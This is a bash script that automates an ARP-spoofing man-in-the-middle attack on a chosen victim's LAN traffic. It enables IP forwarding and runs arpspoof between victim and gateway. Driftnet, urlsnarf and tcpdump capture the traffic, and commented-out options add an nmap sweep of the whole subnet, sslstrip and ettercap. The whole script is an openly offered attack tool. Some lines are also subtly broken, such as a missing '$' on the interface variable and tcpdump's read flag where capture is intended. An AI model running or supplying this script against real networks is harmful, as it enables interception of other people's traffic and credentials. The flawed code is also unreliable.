#A script to automate a single host Man in the Middle attack
#all you need to define is the victim IP address.

for network in $(ifconfig |grep "inet addr:" |grep -v 127.0.0.1 |cut -d: -f2 |cut -d" " -f1 |cut -d. -f1-3 ); do
echo "Beginning simple MITM attack"
echo "What victim would you like to attack on the $network.0 network?"
read victim

echo "Establishing traffic forwarding for system"
echo 1 > /proc/sys/net/ipv4/ip_forward

for interface in $(ip route |grep default |cut -d" " -f5 |sort -u); do
for gateway in $(ip route |grep default |cut -d" " -f3 |sort -u); do

#Comment out lines 6&7 and uncomment out lines 17-19 for full automated MITM attack

#echo "Scanning for all victims"
#nmap -PR -n -sn -v $network.* |grep report | grep -v down |cut -d" " -f5 >$network.victim_list.txt
#for victim in $( cat $network.victim_list.txt ); do

xterm -e arpspoof -i interface -t $victim $gateway &
xterm -e arpspoof -i interface -t $gateway $victim &

xterm -e driftnet -i $interface &
xterm -e urlsnarf -i $interface &
xterm -e tcpdump -i $interface -r $victim.MITM.txt &

#xterm -e sslstrip -k -a -w $victim.sslstrip.txt &
#xterm -e ettercap -Tq -i $interface -L $victim.ettercap.txt &

done
done
done
